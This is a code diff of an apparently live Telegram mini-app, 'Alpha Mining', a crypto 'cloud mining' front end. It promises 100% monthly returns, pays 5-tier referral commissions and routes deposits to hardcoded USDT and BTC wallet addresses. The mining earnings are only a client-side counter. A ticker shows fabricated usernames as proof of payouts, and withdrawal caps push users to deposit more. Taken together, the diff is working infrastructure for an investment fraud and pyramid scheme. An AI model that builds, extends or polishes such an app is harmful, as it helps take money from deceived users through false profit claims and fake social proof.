@@ -112,6 +112,7 @@
       100% { transform: translate(110px, 80px) scale(1.1); }
     }
 
+    /* Themes */
     body.theme-cyber .aurora-bg-canvas {
       background: radial-gradient(circle at 50% 10%, #002b36 0%, #021217 60%, #01080a 100%);
     }
@@ -200,10 +201,10 @@
 
       <div class="flex items-center gap-2">
         <div class="flex items-center gap-1.5 bg-gradient-to-r from-blue-600 via-indigo-600 to-cyan-500 text-white text-xs font-bold pl-1 pr-3 py-1 rounded-full shadow-md">
-          <div class="w-6 h-6 rounded-full bg-cyan-300 text-[#080d19] flex items-center justify-center text-[10px] font-black" id="header-avatar-initials">
-            AM
+          <div class="w-6 h-6 rounded-full bg-cyan-300 text-[#080d19] flex items-center justify-center text-[10px] font-black uppercase" id="header-avatar-initials">
+            U
           </div>
-          <span class="tracking-tight" id="header-user-title">Alpha Node ⚡</span>
+          <span class="tracking-tight max-w-[110px] truncate" id="header-user-title">Miner ⚡</span>
         </div>
 
         <div class="flex items-center gap-1.5 bg-white/10 border border-white/15 px-2.5 py-1 rounded-full text-xs font-semibold text-cyan-200">
@@ -222,7 +223,7 @@
       <div onclick="openWalletModal()" class="frosted-glass px-4 py-1.5 rounded-full flex items-center gap-2 text-xs font-semibold text-slate-200 cursor-pointer tap-scale">
         <span class="w-5 h-5 rounded-full bg-[#26a17b] text-white flex items-center justify-center font-black text-[11px]">₮</span>
         <span class="font-extrabold text-white text-sm" id="vault-usdt-balance">0.0000 USDT</span>
-        <span class="text-slate-300 font-medium">Global vault</span>
+        <span class="text-slate-300 font-medium">Vault</span>
         <span class="text-cyan-400 text-[10px]">▼</span>
       </div>
     </div>
@@ -308,7 +309,7 @@
           <div class="frosted-glass p-3 rounded-2xl flex items-center justify-between text-left text-xs">
             <div>
               <div class="font-extrabold text-white text-[11px]">2X Double Profit Engine (100% Monthly Gain)</div>
-              <div class="text-[10px] text-slate-300" id="deposit-double-summary">Example: 30 USDT deposit yields 60.00 USDT monthly</div>
+              <div class="text-[10px] text-slate-300" id="deposit-double-summary">Deposit to earn 2X double payout monthly</div>
             </div>
             <div class="bg-emerald-500/20 text-emerald-300 border border-emerald-500/50 text-[10px] font-black px-2.5 py-1 rounded-lg">
               200% Payout
@@ -335,7 +336,7 @@
             </div>
           </div>
 
-          <!-- USDT Balance Card -->
+          <!-- USDT Balance Card (Strictly 0.0000 for new user) -->
           <div class="frosted-glass rounded-3xl p-4 relative border-cyan-400/30">
             <div class="flex justify-between items-start">
               <span class="text-xs font-semibold text-slate-300">USDT balance</span>
@@ -348,7 +349,7 @@
               <div class="text-[11px] text-emerald-400 font-medium" id="wallet-connection-label">PoY Active</div>
             </div>
             <div class="mt-3 flex items-center justify-between text-[11px]">
-              <span class="bg-cyan-500/20 text-cyan-300 font-bold px-2 py-0.5 rounded-md border border-cyan-500/30" id="daily-pct-display">200% Mo</span>
+              <span class="bg-cyan-500/20 text-cyan-300 font-bold px-2 py-0.5 rounded-md border border-cyan-500/30" id="daily-pct-display">Free</span>
               <span class="text-slate-400">Yield mode</span>
             </div>
           </div>
@@ -364,11 +365,11 @@
           </button>
         </div>
 
-        <!-- Withdrawal Rule Banner (1x / Week before upgrade) -->
+        <!-- Withdrawal Rule Banner -->
         <div class="bg-black/40 border border-white/15 rounded-2xl px-3.5 py-2.5 flex items-center justify-between text-xs">
           <div>
             <div class="text-slate-300 font-semibold">Min: <strong class="text-white">$10.00 USDT</strong> • Limit: <strong class="text-[#ccff00]">1 Time / Week</strong></div>
-            <div class="text-[10px] text-slate-400 mt-0.5">2nd weekly withdrawal unlocks automatically on Rig Upgrade</div>
+            <div class="text-[10px] text-slate-400 mt-0.5">2nd weekly withdrawal unlocks on Rig Upgrade</div>
           </div>
           <span class="text-cyan-300 font-mono font-bold bg-white/10 px-2 py-1 rounded-lg shrink-0 ml-2" id="weekly-withdraw-count-label">0/1 this week</span>
         </div>
@@ -387,20 +388,20 @@
               <div class="text-[10px] text-cyan-300 font-bold">Starter Node</div>
               <div class="font-black text-white mt-0.5">10 USDT</div>
               <div class="text-[10px] text-[#ccff00] font-mono mt-1 font-black">20.00 USDT</div>
-              <div class="text-[9px] text-slate-400">Monthly Profit</div>
+              <div class="text-[9px] text-slate-400">Monthly Return</div>
             </div>
             <div class="bg-cyan-950/50 border border-cyan-400/50 rounded-2xl p-2.5 relative">
               <span class="absolute -top-2 left-1/2 -translate-x-1/2 bg-cyan-400 text-[#080d19] text-[8px] font-black px-1.5 py-0.2 rounded-full uppercase">Popular</span>
               <div class="text-[10px] text-white font-bold">Double Hash</div>
               <div class="font-black text-white mt-0.5">30 USDT</div>
               <div class="text-[10px] text-[#ccff00] font-mono mt-1 font-black">60.00 USDT</div>
-              <div class="text-[9px] text-slate-300">Monthly Profit</div>
+              <div class="text-[9px] text-slate-300">Monthly Return</div>
             </div>
             <div class="bg-white/5 border border-white/10 rounded-2xl p-2.5">
               <div class="text-[10px] text-purple-300 font-bold">Turbo Rig</div>
               <div class="font-black text-white mt-0.5">100 USDT</div>
               <div class="text-[10px] text-[#ccff00] font-mono mt-1 font-black">200.00 USDT</div>
-              <div class="text-[9px] text-slate-400">Monthly Profit</div>
+              <div class="text-[9px] text-slate-400">Monthly Return</div>
             </div>
           </div>
         </div>
@@ -438,12 +439,20 @@
         </div>
       </div>
 
-      <!-- SCREEN 2: FRIENDS -->
+      <!-- SCREEN 2: FRIENDS (ACCURATE BOT LINK & REFFERALS) -->
       <div id="screen-friends" class="space-y-4 hidden">
         <div class="pt-2">
           <h2 class="text-xl font-black text-white leading-tight">
             Invite friends and raise your hourly income
           </h2>
+
+          <!-- Referral Link Box Display -->
+          <div class="mt-3 bg-black/40 border border-white/15 p-3 rounded-2xl">
+            <div class="text-[10px] text-slate-400 uppercase font-bold tracking-wider mb-1">Your Personal Bot Referral Link:</div>
+            <div class="text-xs font-mono text-cyan-300 break-all select-all font-bold" id="my-referral-link-display">
+              http://t.me/AlphaMineAi_Bot/Win?startapp=...
+            </div>
+          </div>
 
           <div class="grid grid-cols-2 gap-3 mt-3">
             <button onclick="copyInviteLink()" class="frosted-glass text-white font-extrabold py-3 rounded-2xl tap-scale flex items-center justify-center gap-2 text-xs">
@@ -464,16 +473,23 @@
               <div class="w-8 h-8 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-sm">📈</div>
               <div>
                 <div class="font-extrabold text-xs text-white">+5 coins and 10% USDT</div>
-                <div class="text-[10px] text-slate-300">First invite</div>
+                <div class="text-[10px] text-slate-300">Instant deposit commission</div>
               </div>
             </div>
-            <div class="bg-white/5 rounded-2xl p-3 flex items-center gap-3">
-              <div class="w-8 h-8 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-sm">📈</div>
-              <div>
-                <div class="font-extrabold text-xs text-white">+5 coins and 10% USDT</div>
-                <div class="text-[10px] text-slate-300">Further invites</div>
-              </div>
-            </div>
+          </div>
+        </div>
+
+        <div class="frosted-glass rounded-3xl p-4 space-y-3 border-cyan-400/30">
+          <div class="flex items-center gap-2 text-cyan-300 font-black text-xs">
+            <span>🔥</span> 5-Tier Referral Yield Commission
+          </div>
+
+          <div class="grid grid-cols-5 gap-1.5 text-center">
+            <div class="bg-white/5 rounded-xl p-2"><div class="font-black text-sm text-[#ccff00]">10%</div><div class="text-[9px] text-slate-300">L1</div></div>
+            <div class="bg-white/5 rounded-xl p-2"><div class="font-black text-sm text-cyan-300">3%</div><div class="text-[9px] text-slate-300">L2</div></div>
+            <div class="bg-white/5 rounded-xl p-2"><div class="font-black text-sm text-cyan-300">2%</div><div class="text-[9px] text-slate-300">L3</div></div>
+            <div class="bg-white/5 rounded-xl p-2"><div class="font-black text-sm text-slate-200">1%</div><div class="text-[9px] text-slate-300">L4</div></div>
+            <div class="bg-white/5 rounded-xl p-2"><div class="font-black text-sm text-slate-200">1%</div><div class="text-[9px] text-slate-300">L5</div></div>
           </div>
         </div>
       </div>
@@ -509,19 +525,20 @@
             <span class="w-7 h-7 rounded-full bg-blue-500/20 text-blue-400 flex items-center justify-center text-sm">👤</span>
             <span class="text-xs font-black tracking-wider uppercase text-white">ACCOUNT DASHBOARD</span>
           </div>
-          <span class="text-[10px] font-mono text-cyan-400 font-bold" id="account-tg-id-display">ID: 7078896021</span>
+          <span class="text-[10px] font-mono text-cyan-400 font-bold" id="account-tg-id-display">ID: Loading...</span>
         </div>
 
         <div class="grid grid-cols-2 gap-3 text-left">
+          <!-- Real Inviter Identification -->
           <div class="frosted-glass rounded-3xl p-4 space-y-1">
             <div class="flex justify-between items-center text-xs text-slate-400">
               <span>Invited by</span>
               <span class="text-cyan-400">👥</span>
             </div>
             <div class="text-xs font-black text-white pt-1 truncate font-mono" id="acc-invited-by-id">
-              ID 7078896021
+              Direct / Root
             </div>
-            <div class="text-[10px] text-cyan-400 font-medium">Active Referrer</div>
+            <div class="text-[10px] text-cyan-400 font-medium" id="acc-invited-by-sub">Referral Uplink</div>
           </div>
 
           <div class="frosted-glass rounded-3xl p-4 space-y-1">
@@ -549,17 +566,17 @@
               <span>Referral income</span>
               <span class="text-emerald-400">↑</span>
             </div>
-            <div class="text-base font-black text-emerald-400 pt-1">0.40 USDT</div>
+            <div class="text-base font-black text-emerald-400 pt-1" id="acc-referral-income">0.00 USDT</div>
             <div class="text-[10px] text-slate-400">Lifetime bonus</div>
           </div>
 
           <div class="frosted-glass rounded-3xl p-4 space-y-1">
             <div class="flex justify-between items-center text-xs text-slate-400">
-              <span>Referral coins</span>
+              <span>Referral count</span>
               <span class="text-amber-400">🎁</span>
             </div>
-            <div class="text-base font-black text-white pt-1">100 coins</div>
-            <div class="text-[10px] text-slate-400">+5 per invited friend</div>
+            <div class="text-base font-black text-white pt-1" id="acc-referral-count">0 friends</div>
+            <div class="text-[10px] text-slate-400">+5 coins per invite</div>
           </div>
 
           <div class="frosted-glass rounded-3xl p-4 space-y-1">
@@ -759,7 +776,72 @@
 
   <!-- APPLICATION ENGINE & REALTIME SYSTEM -->
   <script>
-    // --- 1. SUPABASE CONNECTION ---
+    // --- 1. TELEGRAM OFFICIAL MINI APP AUTHENTICATION & BOT CONFIG ---
+    const BOT_USERNAME = 'AlphaMineAi_Bot';
+    const BOT_SHORT_NAME = 'Win';
+    const OFFICIAL_BOT_URL = `https://t.me/${BOT_USERNAME}/${BOT_SHORT_NAME}`;
+
+    // Read real user data from Telegram WebApp
+    const tgApp = window.Telegram?.WebApp;
+    if (tgApp) {
+      try {
+        tgApp.ready();
+        tgApp.expand();
+      } catch(e) {}
+    }
+
+    const tgUser = tgApp?.initDataUnsafe?.user;
+
+    // Resolve or generate unique user credentials (per Telegram or browser storage)
+    function resolveUserIdentity() {
+      let storedId = localStorage.getItem('alpha_tg_user_id');
+      let storedUsername = localStorage.getItem('alpha_tg_username');
+
+      if (tgUser && tgUser.id) {
+        storedId = String(tgUser.id);
+        storedUsername = tgUser.username ? `@${tgUser.username}` : (tgUser.first_name || `User_${storedId.slice(-4)}`);
+      } else if (!storedId) {
+        // Unique randomized ID for testing in web browser
+        storedId = String(Math.floor(6000000000 + Math.random() * 3999999999));
+        storedUsername = `Miner_${storedId.slice(-4)}`;
+      }
+
+      localStorage.setItem('alpha_tg_user_id', storedId);
+      localStorage.setItem('alpha_tg_username', storedUsername);
+
+      return { id: storedId, username: storedUsername };
+    }
+
+    const currentUser = resolveUserIdentity();
+
+    // Resolve Inviter from startapp param (e.g. ?startapp=ref_12345 or startParam)
+    function resolveInviterIdentity() {
+      let inviter = localStorage.getItem('alpha_inviter_ref_id');
+      if (inviter) return inviter;
+
+      let param = '';
+      if (tgApp?.initDataUnsafe?.start_param) {
+        param = tgApp.initDataUnsafe.start_param;
+      } else {
+        const urlParams = new URLSearchParams(window.location.search);
+        param = urlParams.get('tgWebAppStartParam') || urlParams.get('startapp') || urlParams.get('ref') || '';
+      }
+
+      if (param) {
+        param = param.replace('ref_', '').trim();
+        // Prevent self-referral
+        if (param !== currentUser.id && param.length >= 4) {
+          inviter = param;
+          localStorage.setItem('alpha_inviter_ref_id', inviter);
+          return inviter;
+        }
+      }
+      return 'Direct / None';
+    }
+
+    const currentInviter = resolveInviterIdentity();
+
+    // --- 2. SUPABASE CONNECTION ---
     const SUPABASE_URL = 'https://ngeiyrrrgxlijyimmgsy.supabase.co';
     const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5nZWl5cnJyZ3hsaWp5aW1tZ3N5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTM4NjkxNTQsImV4cCI6MjEwOTQ0NTE1NH0.bYHaa2E-T-dKujuaUfnrKyWWnpi4Qw0wM1ZHjdH11Go';
     
@@ -772,7 +854,7 @@
       console.warn('Supabase Client warning:', e);
     }
 
-    // --- 2. OFFICIAL DEPOSIT WALLETS ---
+    // --- 3. OFFICIAL VAULT WALLETS ---
     const OFFICIAL_WALLET_ADDRESSES = {
       'USDT BEP20': '0x4a5e6Ee24b1d4C6aCE3b96Dec2Fe8197a6Ca7726',
       'USDT TRC20': 'TF7HnqLafizs5zcK6DTdK55ZWxscunKeDu',
@@ -780,30 +862,14 @@
       'BTC':        'bc1q0r2p6h4mks4axe2e59kjtl0f9p9dlv3y52wp9v'
     };
 
-    // --- 3. DYNAMIC TELEGRAM INVITER RESOLUTION ---
-    function resolveInviterId() {
-      const urlParams = new URLSearchParams(window.location.search);
-      let ref = urlParams.get('tgWebAppStartParam') || urlParams.get('startapp') || urlParams.get('ref');
-      if (ref) {
-        ref = ref.replace('ref_', '').trim();
-        if (ref.length > 2) return ref;
-      }
-      let savedInviter = localStorage.getItem('alpha_inviter_id');
-      if (!savedInviter) {
-        savedInviter = String(Math.floor(5000000000 + Math.random() * 4999999999));
-        localStorage.setItem('alpha_inviter_id', savedInviter);
-      }
-      return savedInviter;
-    }
-
-    // --- 4. STATE ENGINE ---
-    const STORAGE_KEY = 'alpha_mining_master_v12';
+    // --- 4. USER STATE (ISOLATED PER USER ID - STARTS STRICTLY AT 0.0000 USDT) ---
+    const STORAGE_KEY = `alpha_state_${currentUser.id}`;
     const defaultState = {
-      telegram_id: 7078896021,
-      invitedBy: resolveInviterId(),
-      username: 'Alpha Node',
+      telegram_id: currentUser.id,
+      username: currentUser.username,
+      invitedBy: currentInviter,
       miningAmount: 0.000000000,
-      usdtBalance: 0.0000,
+      usdtBalance: 0.0000,          // <-- STRICTLY 0.0000 for any new user!
       coins: 100,
       level: 1,
       isUpgraded: false,
@@ -811,50 +877,49 @@
       lastGiftClaimTime: 0,
       walletConnected: false,
       walletAddress: '',
-      walletBrand: '',
       theme: 'aurora',
       lastTimestamp: Date.now(),
       activeTab: 'mine',
-      // Weekly withdrawal tracking (1x max before upgrade)
       withdrawalsThisWeek: 0,
       weekStartTimestamp: Date.now(),
       processedDepositIds: []
     };
 
     let state = JSON.parse(localStorage.getItem(STORAGE_KEY) || 'null') || defaultState;
-    if (typeof state.coins !== 'number' || state.coins < 100) state.coins = 100;
+    // Enforce identity sync
+    state.telegram_id = currentUser.id;
+    state.username = currentUser.username;
+    state.invitedBy = currentInviter;
     if (state.usdtBalance === undefined) state.usdtBalance = 0.0000;
-    if (!state.invitedBy) state.invitedBy = resolveInviterId();
+    if (typeof state.coins !== 'number' || state.coins < 100) state.coins = 100;
     if (!Array.isArray(state.processedDepositIds)) state.processedDepositIds = [];
 
-    // Reset weekly withdrawals after 7 days
+    // Weekly reset check
     const ONE_WEEK_MS = 7 * 24 * 60 * 60 * 1000;
     if (!state.weekStartTimestamp || (Date.now() - state.weekStartTimestamp > ONE_WEEK_MS)) {
       state.withdrawalsThisWeek = 0;
       state.weekStartTimestamp = Date.now();
     }
 
-    // --- 5. 2X DOUBLE RETURN MATH (100% MONTHLY GAIN) ---
-    // Example: If user deposits 30$, monthly yield = 60$!
-    // Daily rate = (Deposit * 2.0) / 30 days
+    // --- 5. MINING CALCULATION (2X DOUBLE ONLY IF APPROVED) ---
     const BASE_STARTER_RATE_PER_SEC = 0.02 / 86400; // Free starter $0.02/day
 
     function getCurrentMiningRatePerSec() {
       if (!state.isUpgraded || !state.upgradeAmount) {
-        return BASE_STARTER_RATE_PER_SEC;
+        return BASE_STARTER_RATE_PER_SEC; // Exact $0.02/day
       } else {
-        // 2x double calculation: monthly output is 2 * upgradeAmount
+        // 2X Double Yield: Monthly output is 2 * upgradeAmount
         const targetMonthlyYield = state.upgradeAmount * 2.0; 
         const dailyYield = targetMonthlyYield / 30.0;
         return dailyYield / 86400.0;
       }
     }
 
-    // --- 6. REALTIME SUPABASE APPROVAL LISTENER ---
+    // --- 6. REALTIME SUPABASE LISTENER FILTERED STRICTLY TO THIS TELEGRAM ID ---
     function setupSupabaseDepositListener() {
       if (!supabaseClient) return;
 
-      // Check existing approved deposits
+      // Check existing approved deposits ONLY for this user's specific Telegram ID
       supabaseClient
         .from('deposits')
         .select('*')
@@ -866,9 +931,9 @@
           }
         });
 
-      // Realtime listener
+      // Realtime listener filtered to ONLY this user's telegram_id
       supabaseClient
-        .channel('user_deposits_sync')
+        .channel(`user_deposits_${state.telegram_id}`)
         .on('postgres_changes', { 
           event: 'UPDATE', 
           schema: 'public', 
@@ -883,15 +948,15 @@
     }
 
     function processApprovedDeposit(dep) {
-      if (state.processedDepositIds.includes(dep.id)) return;
+      if (state.processedDepositIds.includes(dep.id)) return; // Already processed
 
       const approvedUsdt = Number(dep.amount) || 0;
       state.processedDepositIds.push(dep.id);
 
-      // Add to balance
+      // 1. Credit approved amount to user's USDT Balance
       state.usdtBalance += approvedUsdt;
 
-      // Upgrade Rig to 2x Double Mining Rate
+      // 2. Activate 2X Double Upgrade Rig
       state.isUpgraded = true;
       state.upgradeAmount = Math.max(state.upgradeAmount || 0, approvedUsdt);
       state.level = state.upgradeAmount >= 30 ? 3 : (state.upgradeAmount >= 10 ? 2 : 1);
@@ -899,14 +964,14 @@
       saveState();
       updateAllUI();
 
-      showToast(`🎉 Approved! +$${approvedUsdt.toFixed(2)} USDT Added! 2X Double Yield (Monthly $${(state.upgradeAmount*2).toFixed(2)}) Active!`, '⚡');
+      showToast(`🎉 Approved! +$${approvedUsdt.toFixed(2)} USDT Credited! 2X Double Yield Active!`, '⚡');
       
       if (window.Telegram?.WebApp?.HapticFeedback) {
         window.Telegram.WebApp.HapticFeedback.notificationOccurred('success');
       }
     }
 
-    // --- 7. NEVER-REPEATING DYNAMIC CLAIM PROOFS ---
+    // --- 7. DYNAMIC CLAIM PROOFS ---
     const namePrefixes = ['ton', 'sol', 'crypto', 'alex', 'neo', 'vlad', 'sara', 'dex', 'alpha', 'matrix', 'maria', 'sam', 'whale', 'miner', 'node', 'zen'];
     const nameSuffixes = ['pro', 'web3', '99', 'sol', 'ton', '77', 'btc', 'dev', 'king', 'vip', 'trade', '88', 'x'];
 
@@ -932,7 +997,7 @@
       }, 1400);
     }
 
-    // --- 8. LIVE MINING COUNTER STREAM ---
+    // --- 8. MINING ENGINE ---
     function startLiveMiningEngine() {
       setInterval(() => {
         const ratePerSec = getCurrentMiningRatePerSec();
@@ -952,6 +1017,12 @@
       const counterEl = document.getElementById('streaming-mining-counter');
       if (counterEl) counterEl.innerText = `$${state.miningAmount.toFixed(9)}`;
 
+      // Headers & Identity
+      document.getElementById('header-user-title').innerText = `${state.username} ⚡`;
+      document.getElementById('header-avatar-initials').innerText = state.username.replace('@','').charAt(0).toUpperCase() || 'U';
+      document.getElementById('account-tg-id-display').innerText = `ID: ${state.telegram_id}`;
+
+      // USDT Balance displays
       const usdtFormatted = `$${state.usdtBalance.toFixed(4)}`;
       document.getElementById('in-app-usdt-display').innerText = usdtFormatted;
       document.getElementById('vault-usdt-balance').innerText = `${state.usdtBalance.toFixed(4)} USDT`;
@@ -961,7 +1032,7 @@
       document.getElementById('acc-coins').innerHTML = `${state.coins} <span class="text-xs font-normal text-slate-300">coins</span>`;
       document.getElementById('acc-coins-usd').innerText = `≈$${state.coins}.00 USDT`;
 
-      // Rates formatted (Exact 2x Double when upgraded)
+      // Mining rates
       const currentRateSec = getCurrentMiningRatePerSec();
       const rateHr = (currentRateSec * 3600).toFixed(6);
       const rateDay = (currentRateSec * 86400).toFixed(4);
@@ -970,9 +1041,21 @@
       document.getElementById('rate-display-day').innerText = `$${rateDay}`;
       document.getElementById('rate-display-mo').innerText = `$${rateMo}`;
 
-      document.getElementById('acc-invited-by-id').innerText = `ID ${state.invitedBy}`;
+      // Invited by Display
+      if (state.invitedBy && state.invitedBy !== 'Direct / None') {
+        document.getElementById('acc-invited-by-id').innerText = `ID ${state.invitedBy}`;
+        document.getElementById('acc-invited-by-sub').innerText = 'Active Referrer';
+      } else {
+        document.getElementById('acc-invited-by-id').innerText = 'Direct Join';
+        document.getElementById('acc-invited-by-sub').innerText = 'Root Node';
+      }
 
-      // Weekly withdraw limit badge
+      // Referral link display
+      const myRefLink = `${OFFICIAL_BOT_URL}?startapp=ref_${state.telegram_id}`;
+      const refLinkBox = document.getElementById('my-referral-link-display');
+      if (refLinkBox) refLinkBox.innerText = myRefLink;
+
+      // Weekly limit
       const allowedWeekly = state.isUpgraded ? 2 : 1;
       document.getElementById('weekly-withdraw-count-label').innerText = `${state.withdrawalsThisWeek}/${allowedWeekly} this week`;
 
@@ -986,7 +1069,7 @@
         document.getElementById('level-display').innerText = `Tier 1`;
         document.getElementById('daily-pct-display').innerText = `Free`;
         document.getElementById('speed-status-badge').innerText = `🛡️ Free starter speed: 0.02 USDT/day — Top up for 2x Double Yield`;
-        document.getElementById('deposit-double-summary').innerText = `Example: 30 USDT deposit yields 60.00 USDT monthly`;
+        document.getElementById('deposit-double-summary').innerText = `Deposit to earn 2X double payout monthly`;
       }
 
       setAppTheme(state.theme || 'aurora');
@@ -1021,7 +1104,7 @@
       showToast(`+$${harvested.toFixed(4)} USDT credited to balance!`, '🎉');
     }
 
-    // --- 10. WITHDRAWAL HANDLER (1 TIME/WEEK BEFORE UPGRADE) ---
+    // --- 10. WITHDRAWAL HANDLER ---
     function handleWithdrawClick() {
       if (!state.walletConnected) {
         alert('Please connect your TON wallet first before withdrawing!');
@@ -1029,22 +1112,18 @@
         return;
       }
 
-      // Rule 1: Min 10 USDT
       if (state.usdtBalance < 10.0) {
         alert(`❌ Minimum withdrawal amount is 10.00 USDT.\nYour current balance: $${state.usdtBalance.toFixed(4)} USDT.`);
         return;
       }
 
-      // Rule 2: Just 1 time per week before upgrade!
       const allowedWeeklyLimit = state.isUpgraded ? 2 : 1;
-
       if (state.withdrawalsThisWeek >= allowedWeeklyLimit) {
         alert(`⚠️ Weekly Withdrawal Limit Reached (${state.withdrawalsThisWeek}/${allowedWeeklyLimit} Used)!\n\nYou can only withdraw 1 time per week on starter tier.\n\nPlease upgrade your mining rig or top up USDT to unlock higher weekly withdrawals!`);
         openTopUpModal();
         return;
       }
 
-      // Process withdrawal
       const withdrawAmount = state.usdtBalance;
       state.usdtBalance = 0.0;
       state.withdrawalsThisWeek += 1;
@@ -1062,7 +1141,7 @@
         ]).then(() => {});
       }
 
-      showToast(`Withdrawal of $${withdrawAmount.toFixed(2)} USDT submitted! (${state.withdrawalsThisWeek}/${allowedWeeklyLimit} used)`, '💸');
+      showToast(`Withdrawal of $${withdrawAmount.toFixed(2)} USDT submitted!`, '💸');
       alert(`✅ Withdrawal submitted successfully!\nAmount: $${withdrawAmount.toFixed(4)} USDT\nDestination: ${state.walletAddress}\nWeekly usage: ${state.withdrawalsThisWeek}/${allowedWeeklyLimit}.`);
     }
 
@@ -1242,17 +1321,6 @@
         console.error('Supabase exception:', err);
       }
 
-      const queue = JSON.parse(localStorage.getItem('alpha_pending_deposits') || '[]');
-      queue.push({
-        id: Date.now(),
-        telegram_id: state.telegram_id,
-        amount: selectedAmount,
-        network: selectedNet,
-        tx_hash: tx,
-        timestamp: new Date().toLocaleString()
-      });
-      localStorage.setItem('alpha_pending_deposits', JSON.stringify(queue));
-
       document.getElementById('deposit-tx-hash-input').value = '';
       submitBtn.innerText = 'Authorize & Submit to Admin ➔';
       submitBtn.disabled = false;
@@ -1303,7 +1371,7 @@
       showToast('Wallet disconnected', '🔌');
     }
 
-    // --- 15. TABS ---
+    // --- 15. TABS & REFFERAL ACTIONS (USING YOUR EXACT BOT LINK) ---
     const tabs = ['mine', 'friends', 'gifts', 'account'];
     function switchTab(tId) {
       state.activeTab = tId;
@@ -1330,24 +1398,28 @@
     }
 
     function copyInviteLink() {
-      navigator.clipboard.writeText(`https://t.me/AlphaMiningCrypto_bot?startapp=ref_${state.telegram_id}`);
-      showToast('Invite link copied!', '📋');
+      const link = `${OFFICIAL_BOT_URL}?startapp=ref_${state.telegram_id}`;
+      navigator.clipboard.writeText(link);
+      showToast('Official Bot Invite link copied!', '📋');
     }
+
     function shareInviteTelegram() {
-      const link = encodeURIComponent(`https://t.me/AlphaMiningCrypto_bot?startapp=ref_${state.telegram_id}`);
-      window.open(`https://t.me/share/url?url=${link}&text=Join%20Alpha%20Mining!`, '_blank');
+      const refLink = `${OFFICIAL_BOT_URL}?startapp=ref_${state.telegram_id}`;
+      const shareUrl = `https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent('🚀 Join Alpha Mining! Start cloud mining with 2X double yields and daily rewards!')}`;
+      window.open(shareUrl, '_blank');
     }
 
     function openHowToEarnModal() {
       alert('💡 Alpha Mining 2X Return Guide:\n1. Whatever you deposit generates 100% Monthly Gain (Double).\n2. Example: 30 USDT generates 60.00 USDT in 30 days.\n3. Withdrawal: Minimum 10 USDT. Starter tier allows 1 withdrawal per week; upgrading unlocks 2 withdrawals per week.');
     }
+
     function handleCloseApp() {
       saveState();
       if (window.Telegram?.WebApp?.close) window.Telegram.WebApp.close();
       else alert('App closed. Mining continues 24/7!');
     }
 
-    // Boot
+    // Boot App
     updateAllUI();
     startLiveMiningEngine();
     startEverySecondClaimTicker();
